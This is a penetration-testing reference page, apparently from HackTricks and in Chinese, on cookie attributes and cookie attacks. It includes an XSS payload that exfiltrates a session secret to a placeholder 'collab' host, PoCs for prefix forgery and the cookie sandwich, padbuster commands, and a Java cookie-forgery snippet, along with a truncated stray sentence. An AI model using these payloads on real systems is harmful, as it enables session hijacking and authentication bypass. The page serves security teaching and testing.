# Cookies Hacking

{{#include ../../banners/hacktricks-training.md}}

## Cookie 属性

Cookies 带有多个属性，用于控制它们在用户浏览器中的行为。下面以较为被动的语气概述这些属性：

### Expires and Max-Age

cookie 的过期日期由 `Expires` 属性决定。相反，`Max-age` 属性定义了 cookie 在多少秒后被删除。**优先使用 `Max-age`，因为它更符合现代做法。**

### Domain

接收 cookie 的主机由 `Domain` 属性指定。默认情况下，此值为发出 cookie 的主机，不包括其子域名。然而，当显式设置了 `Domain` 属性时，它也会包含子域名。在需要在子域间共享 cookie 的场景中，指定 `Domain` 属性会是不那么严格的选择。例如，设置 `Domain=mozilla.org` 会使 cookie 在其子域（如 `developer.mozilla.org`）上可用。

### Path

`Path` 属性指示必须出现在请求 URL 中的特定路径，才能发送 `Cookie` 头。此属性将 `/` 字符视为目录分隔符，因此也允许匹配子目录。

### Ordering Rules

当两个 cookie 拥有相同名称时，选择发送哪个 cookie 的规则基于：

- 与请求 URL 匹配最长路径的 cookie。
- 如果路径相同，则选择最近设置的 cookie。

### SameSite

- `SameSite` 属性决定是否在来自第三方域的请求上发送 cookie。它提供三种设置：
- **Strict**：限制 cookie 在第三方请求中被发送。
- **Lax**：允许 cookie 随由第三方网站发起的 GET 请求一起发送。
- **None**：允许 cookie 从任何第三方域发送。

在配置 cookie 时，理解这些属性可以帮助确保它们在不同场景中按预期工作。

| **Request Type** | **Example Code**                   | **Cookies Sent When** |
| ---------------- | ---------------------------------- | --------------------- |
| Link             | \<a href="...">\</a>               | NotSet\*, Lax, None   |
| Prerender        | \<link rel="prerender" href=".."/> | NotSet\*, Lax, None   |
| Form GET         | \<form method="GET" action="...">  | NotSet\*, Lax, None   |
| Form POST        | \<form method="POST" action="..."> | NotSet\*, None        |
| iframe           | \<iframe src="...">\</iframe>      | NotSet\*, None        |
| AJAX             | $.get("...")                       | NotSet\*, None        |
| Image            | \<img src="...">                   | NetSet\*, None        |

Table from [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) and slightly modified.\
具有 _**SameSite**_ 属性的 cookie 将 **缓解需要登录会话的 CSRF 攻击**。

**\*注意，从 Chrome80 (feb/2019) 起，未设置 SameSite 属性的 cookie 的默认行为将是 lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/))。\
注意，在应用此更改后的临时阶段，Chrome 中 **没有 SameSite** **策略** 的 **cookie** 在 **前 2 分钟内将被视为 None，之后在顶级跨站 POST 请求中将被视为 Lax。**

## Cookies Flags

### HttpOnly

这会阻止 **client** 访问 cookie（例如通过 **Javascript**：`document.cookie`）

#### **Bypasses**

- 如果页面将 cookie 作为请求的响应发送（例如在 **PHPinfo** 页面中），可以滥用 XSS 向该页面发送请求并从响应中**窃取 cookie**（参见示例：[https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)）。
- 这可以通过 **TRACE** **HTTP** 请求绕过，因为服务器的响应（如果该 HTTP 方法可用）会反射发送的 cookie。该技术称为 **Cross-Site Tracking**。
- 现代浏览器通过不允许从 JS 发送 TRACE 请求来避免此技术。然而，在某些特定软件中发现了一些绕过，比如向 IE6.0 SP2 发送 `\r\nTRACE` 而不是 `TRACE`。
- 另一种方法是利用浏览器的 zero/day 漏洞。
- 可以通过执行 Cookie Jar overflow attack 来**覆盖 HttpOnly cookie**：


{{#ref}}
cookie-jar-overflow.md
{{#endref}}

- 可以使用 [**Cookie Smuggling**](#cookie-smuggling) 攻击来外泄这些 cookie
- 如果任何 server-side 端点在 HTTP 响应中回显原始会话 ID（例如在 HTML 注释或调试块中），你可以通过使用 XSS gadget 去获取该端点、用 regex 提取 secret 并将其 exfiltrate 来绕过 HttpOnly。示例 XSS payload 模式：
```js
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
.then(r => r.text())
.then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### 安全

该请求**仅**会在通过安全通道（通常为 **HTTPS**）传输时，在 HTTP 请求中发送 cookie。

## Cookies 前缀

以 `__Secure-` 为前缀的 cookies 要求在受 HTTPS 保护的页面上，并且必须与 `secure` 标志一起设置。

对于以 `__Host-` 为前缀的 cookies，必须满足以下几个条件：

- 必须使用 `secure` 标志设置。
- 必须来自受 HTTPS 保护的页面。
- 禁止指定 domain，从而防止其被发送到子域。
- 这些 cookies 的 path 必须设置为 `/`。

需要注意的是，以 `__Host-` 为前缀的 cookies 不允许被发送到超域或子域。此限制有助于隔离应用的 cookies。因此，对所有应用 cookie 使用 `__Host-` 前缀可视为增强安全性和隔离性的良好做法。

### 覆盖 cookies

因此，`__Host-` 前缀 cookies 的一个保护措施是防止它们被子域覆盖。例如防止 [**Cookie Tossing attacks**](cookie-tossing.md)。在演讲 [**Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg) （[**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf)）中展示了可以通过欺骗解析器从子域设置 \_\_HOST- 前缀的 cookies，例如在开头或前后添加 "=" 等方式：

<figure><img src="../../images/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

或者在 PHP 中，可以在 cookie 名称开头添加 **其他字符**，这些字符会被 **替换为下划线**，从而允许覆盖 `__HOST-` cookies：

<figure><img src="../../images/image (7) (1) (1) (1) (1).png" alt="" width="373"><figcaption></figcaption></figure>


#### Unicode whitespace cookie-name smuggling (prefix forgery)

通过在 cookie 名称前添加一个 Unicode 空白代码点，滥用浏览器与服务器解析之间的不一致。浏览器不会将名称视为字面上以 `__Host-`/`__Secure-` 开头，因此允许从子域设置。如果后端在 cookie 键上修剪/规范化前导 Unicode 空白，它将看到受保护的名称，并可能覆盖高权限的 cookie。

- 来自可设置父域 cookie 的子域的 PoC：
```js
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```
- 导致该问题的典型后端行为：
- 框架会修剪/规范化 cookie 键。在 Django 中，Python 的 `str.strip()` 会移除大量 Unicode 空白码点，导致名称规范化为 `__Host-name`。
- 常被修剪的码点包括：U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288)。
- 许多框架在处理重复 cookie 名称时采用“last wins”策略，因此攻击者可控的规范化 cookie 值会覆盖合法的值。

- 浏览器差异很重要：
- Safari 会在 cookie 名称中阻止多字节 Unicode 空白（例如会拒绝 U+2000），但仍允许单字节的 U+0085 和 U+00A0，而许多后端会修剪这些。请在不同浏览器间交叉测试。

- 影响：允许从较不受信任的上下文（子域）覆盖 `__Host-`/`__Secure-` cookies，这可能导致 XSS（若为反射型）、CSRF token 覆盖，以及 session fixation。

- 链路上 vs 服务器视图示例（名称中存在 U+2000）：
```
Cookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;
```
许多后端会 split/parse 然后 trim，导致归一化的 `__Host-name` 采用 attacker 的值。

#### 遗留的 `$Version=1` cookie splitting 在 Java 后端（prefix bypass）

在某些 Java 堆栈（例如 Tomcat/Jetty-style）中，当 `Cookie` header 以 `$Version=1` 开头时，仍会启用遗留的 RFC 2109/2965 解析。这可能导致服务器将单个 cookie 字符串重新解释为多个逻辑 cookie，并接受一个最初从子域或甚至不安全来源设置的伪造 `__Host-` 条目。

- PoC forcing legacy parsing:
```js
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```
- 为什么它能工作：
- 客户端在 set 时会进行前缀检查，但服务器端的 legacy parsing 随后会拆分并规范化 header，从而绕过 `__Host-`/`__Secure-` 前缀的保障意图。

- 适用场景：Tomcat、Jetty、Undertow，或仍然遵循 RFC 2109/2965 属性的框架。可与重复名覆盖语义结合利用。

#### Duplicate-name last-wins overwrite primitive

当两个 cookie 规范化后变为相同的 name 时，许多后端（包括 Django）会采用最后出现的那一个。经过 smuggling/legacy-splitting 导致产生两个 `__Host-*` 名称后，通常由攻击者控制的那个会获胜。

#### Detection and tooling

使用 Burp Suite 探测以下情况：

- 试验多个前导 Unicode 空白 code point：U+2000、U+0085、U+00A0，观察后端是否会 trim 并将 name 视为带前缀。
- 在 Cookie header 中先发送 `$Version=1`，检查后端是否执行 legacy splitting/normalization。
- 通过注入两个规范化后相同 name 的 cookies 来观察重复名解析（先者获胜还是后者获胜）。
- 使用 Burp Custom Action 自动化此流程：[CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

> Tip: 这些技术利用了 RFC 6265 的 octet-vs-string 缺口：浏览器发送字节；服务器解码并可能进行规范化/trim。解码与规范化的不一致是绕过的核心。

## Cookies 攻击

如果一个自定义 cookie 包含敏感数据，请务必检查它（尤其是在你参与 CTF 时），因为它可能存在漏洞。

### 解码与篡改 Cookies

嵌入在 cookie 中的敏感数据应始终被审查。以 Base64 或类似格式编码的 cookies 通常可以被解码。该漏洞允许攻击者更改 cookie 内容，并将修改后的数据重新编码回 cookie，从而冒充其他用户。

### Session Hijacking

该攻击涉及窃取用户的 cookie 以获取对其在应用内账户的未授权访问。通过使用被窃取的 cookie，攻击者可以冒充合法用户。

### Session Fixation

在这种情形下，攻击者诱骗受害者使用特定的 cookie 登录。如果应用在登录时不分配新的 cookie，则持有原始 cookie 的攻击者可以冒充受害者。该技术依赖于受害者使用攻击者提供的 cookie 登录。

如果你在子域发现了 **XSS** 或者你 **控制一个子域**，请阅读：

{{#ref}}
cookie-tossing.md
{{#endref}}

### Session Donation

在这里，攻击者说服受害者使用攻击者的 session cookie。受害者以为自己登录的是自己的账户，结果会在攻击者账户的上下文中执行操作。

如果你在子域发现了 **XSS** 或者你 **控制一个子域**，请阅读：

{{#ref}}
cookie-tossing.md
{{#endref}}

### [JWT Cookies](../hacking-jwt-json-web-tokens.md)

点击上面的链接以访问说明 JWT 可能缺陷的页面。

JSON Web Tokens (JWT) 用在 cookies 中也可能存在漏洞。欲了解潜在缺陷及如何利用的深入信息，建议查看链接的 hacking JWT 文档。

### Cross-Site Request Forgery (CSRF)

该攻击强制处于登录状态的用户在其当前已认证的 web 应用上执行不希望的操作。攻击者可以利用会随每次请求自动发送到易受攻击站点的 cookies。

### 空 Cookie

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) 浏览器允许创建没有 name 的 cookies，下面可以通过 JavaScript 演示：
```js
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
发送的 cookie header 的结果是 `a=v1; test value; b=v2;`。有趣的是，如果设置了一个名称为空的 cookie，就可以操纵 cookie，通过将该空名称 cookie 设置为特定值，可能控制其他 cookie：
```js
function setCookie(name, value) {
document.cookie = `${name}=${value}`
}

setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
这会导致浏览器发送一个 cookie header，被每个 web 服务器 解释为名为 `a`、值为 `b` 的 cookie。

#### Chrome Bug: Unicode 代理代码点问题

在 Chrome 中，如果一个 Unicode 代理代码点 是 set cookie 的一部分，`document.cookie` 会损坏，随后返回一个空字符串：
```js
document.cookie = "\ud800=meep"
```
这会导致 `document.cookie` 输出空字符串，表示永久损坏。

#### Cookie Smuggling（由于解析问题）

(有关更多细节，请参阅[original research](https://blog.ankursundara.com/cookie-bugs/)) 多个 web 服务器（包括来自 Java 的 Jetty、TomCat、Undertow，以及来自 Python 的 Zope、cherrypy、web.py、aiohttp、bottle、webob）由于对 RFC2965 的过时支持，错误地处理 cookie 字符串。它们会将双引号包裹的 cookie 值作为单一值读取，即使其中包含本应用于分隔键值对的分号：
```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Cookie Injection Vulnerabilities

（更多细节见[original research](https://blog.ankursundara.com/cookie-bugs/)）服务器对 cookie 的错误解析，尤其是 Undertow、Zope，以及使用 Python 的 `http.cookie.SimpleCookie` 和 `http.cookie.BaseCookie` 的服务器，创造了进行 cookie 注入攻击的机会。这些服务器无法正确划定新 cookie 的起始位置，从而允许攻击者伪造 cookie：

- Undertow 期望在带引号的值后立刻出现新 cookie，而不需要分号。
- Zope 通过逗号来开始解析下一个 cookie。
- Python 的 cookie 类在遇到空格字符时开始解析。

该漏洞在依赖基于 cookie 的 CSRF 保护的 web 应用中尤其危险，因为它允许攻击者注入伪造的 CSRF-token cookie，从而可能绕过安全措施。Python 对重复 cookie 名称的处理加剧了该问题：最后出现的同名 cookie 会覆盖之前的。对不安全环境下的 `__Secure-` 和 `__Host-` cookie 也引发担忧，并且当 cookie 被传给容易被伪造的 back-end 服务器时，可能导致授权绕过。

### Cookies $version

#### WAF Bypass

根据[**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)，可能可以使用 cookie 属性 **`$Version=1`** 使后端由于遵循 **RFC2109** 而使用旧的解析逻辑。此外，像 **`$Domain`** 和 **`$Path`** 这样的其他属性也可以用来通过 cookie 修改后端行为。

#### Cookie Sandwich Attack

根据[**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique)，可以使用 cookie sandwich 技术窃取 HttpOnly cookies。以下是要求和步骤：

- 找到一个看似无用的 **cookie 在响应中被反射** 的地方
- **Create a cookie called `$Version`** with value `1`（你可以通过 XSS 从 JS 中做到这一点），并设置一个更具体的 path 以便它获得最初的位置（某些框架如 python 不需要此步骤）
- **Create the cookie that is reflected**，其值留下一个 **未闭合的双引号**，并设置特定的 path，使它在 cookie 数据库中的位置排在之前的 (`$Version`) 之后
- 然后，合法的 cookie 将紧随其后排序
- **Create a dummy cookie that closes the double quotse**，在其值中闭合双引号

这样，目标 cookie 会被困在新的 version 1 cookie 中，并且每当它被反射时就会被反射出来。例如，摘自该文章：
```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### WAF 绕过

#### Cookies $version

请查看上一节。

#### 使用 quoted-string encoding 绕过值分析

这种解析会对 cookies 内部被转义的值进行取消转义，所以 "\a" 会变成 "a"。这可以用于绕过 WAFS，例如：

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### 绕过 cookie-name blocklists

在 RFC2109 中指出，**逗号可以作为 cookie 值之间的分隔符**。并且可以在等号的前后添加**空格和制表符**。因此像 `$Version=1; foo=bar, abc = qux` 这样的 cookie 不会生成 `"foo":"bar, admin = qux"`，而是生成 `foo":"bar"` 和 `"admin":"qux"` 这两个 cookies。注意如何生成了 2 个 cookie，以及 admin 的等号前后空格被移除了。

#### 使用 cookie splitting 绕过值分析

最后，不同的后门会将通过不同 cookie headers 传递的不同 cookies 拼接成一个字符串，如下：
```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
这可能允许像下面的示例中那样绕过 WAF：
```
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```
### 额外的易受攻击的 Cookies 检查

#### **基本检查**

- 该 **cookie** 在每次 **login** 时都是 **相同**。
- Log out 并尝试使用相同的 **cookie**。
- 尝试用两台设备（或浏览器）使用相同的 **cookie** 登录同一 **account**。
- 检查该 **cookie** 中是否包含任何信息，并尝试修改它。
- 尝试创建多个用户名几乎相同的 **accounts**，并检查是否能发现相似性。
- 检查 **"remember me"** 选项（如果存在）以了解其工作方式。如果存在且可能存在漏洞，则在没有任何其他 **cookie** 的情况下始终单独使用 **remember me** 的 **cookie**。
- 检查在更改密码后先前的 **cookie** 是否仍然有效。

#### **高级 cookies 攻击**

如果 **cookie** 在你 **log in** 时保持相同（或几乎相同），这很可能意味着 **cookie** 与你的某个 **account** 字段相关（可能是 **username**）。然后你可以：

- 尝试创建大量 **accounts**，其 **usernames** 非常 **similar**，并尝试 **guess** 算法的工作方式。
- 尝试 **bruteforce the username**。如果该 **cookie** 仅作为你 **username** 的认证方法保存，那么你可以创建一个 username 为 "**Bmin**" 的 **account**，并 **bruteforce** cookie 的每一位 **bit**，因为你尝试的 cookie 之一将属于 "**admin**"。
- 尝试 **Padding** **Oracle**（你可以解密 **cookie** 的内容）。使用 **padbuster**。

**Padding Oracle - Padbuster examples**
```bash
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Padbuster 会进行多次尝试，并会询问你哪个条件是错误条件（即不合法的那个）。

然后它会开始解密 cookie（可能需要几分钟）

如果攻击成功执行，那么你可以尝试 **encrypt** 你选择的字符串。例如，如果你想要 **encrypt** **user=administrator**
```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
此执行将为你生成正确加密并编码的 cookie，内部包含字符串 **user=administrator**。

**CBC-MAC**

可能某个 cookie 的值会被用 CBC 签名。然后，该值的完整性由使用 CBC 对相同值产生的 signature 来保证。由于通常建议将 IV 设为 null vector，这种完整性校验可能存在漏洞。

**攻击**

1. 获取用户名 **administ** 的 signature = **t**
2. 获取用户名 **rator\x00\x00\x00 XOR t** 的 signature = **t'**
3. 在 cookie 中设置值 **administrator+t'**（**t'** 将是 **(rator\x00\x00\x00 XOR t) XOR t** = **rator\x00\x00\x00** 的有效 signature）

**ECB**

如果 cookie 使用 ECB 加密，可能存在漏洞。\
当你登录时，收到的 cookie 应该总是相同的。

**如何检测与攻击：**

创建 2 个几乎相同数据的用户（username、password、email 等），并尝试在所给的 cookie 中发现某些 pattern

创建一个用户，例如 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"，并检查 cookie 中是否有任何 pattern（由于 ECB 对每个 block 使用相同的 key 加密，如果 username 被加密，相同的 encrypted bytes 可能会重复出现）。

应该会出现一个 pattern（大小为所用 block 的尺寸）。所以，在知道一串 "a" 被如何加密之后，你可以创建一个 username： "a"\*(size of the block)+"admin"。然后，你可以从 cookie 中删除一个 block 的 "a" 的 encrypted pattern。这样你就会得到 username 为 "admin" 的 cookie。

### Static-key cookie forgery (symmetric encryption of predictable IDs)

一些应用通过对一个可预测的值（例如数字 user ID）仅进行 encrypt，使用一个全局的、hard-coded symmetric key，然后对 ciphertext（hex/base64）进行 encode 来 mint authentication cookies。如果该 key 在产品级（或安装级）是 static，任何人都可以离线 forge cookies 以针对任意用户并 bypass authentication。

How to test/forge
- 识别那些用来 gate auth 的 cookie(s)，例如 COOKIEID 和 ADMINCOOKIEID。
- 确定 cipher/encoding。举个真实案例，应用使用 IDEA 和一个固定的 16-byte key，并以 hex 返回 ciphertext。
- 通过 encrypt 你自己的 user ID 并与发放的 cookie 对比来验证。如果匹配，你就可以为任意 target ID mint cookies（1 经常对应第一个 admin）。
- 将 forge 的值直接设置为 cookie 并浏览；不需要凭证。

<details>
<summary>Minimal Java PoC (IDEA + hex) used in the wild</summary>
```java
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
private String ideaKey = "1234567890123456"; // example static key

public String encode(char[] plainArray) { return encode(new String(plainArray)); }

public String encode(String plain) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA encrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
encrypt.initEncrypt(key);
} catch (KeyException e) { return null; }
if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
plain = plain + " "; // space padding
}
}
byte[] encrypted = encrypt.update(plain.getBytes());
return Hex.toString(encrypted); // cookie expects hex
}

public String decode(String chiffre) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA decrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
decrypt.initDecrypt(key);
} catch (KeyException e) { return null; }
byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
}

public void setKey(String key) { this.ideaKey = key; }
}
```
</details>上下文（例如，服务器端会话带随机 ID，或添加防重放属性）。

## 参考资料

- [当审计失败：TRUfusion Enterprise 中的四个关键预认证漏洞](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://blog.ankursundara.com/cookie-bugs/](https://blog.ankursundara.com/cookie-bugs/)
- [https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
- [https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [https://seclists.org/webappsec/2006/q2/181](https://seclists.org/webappsec/2006/q2/181)
- [https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [Cookie Chaos：如何绕过 __Host 和 __Secure cookie 前缀](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [Burp Custom Action – CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

{{#include ../../banners/hacktricks-training.md}}
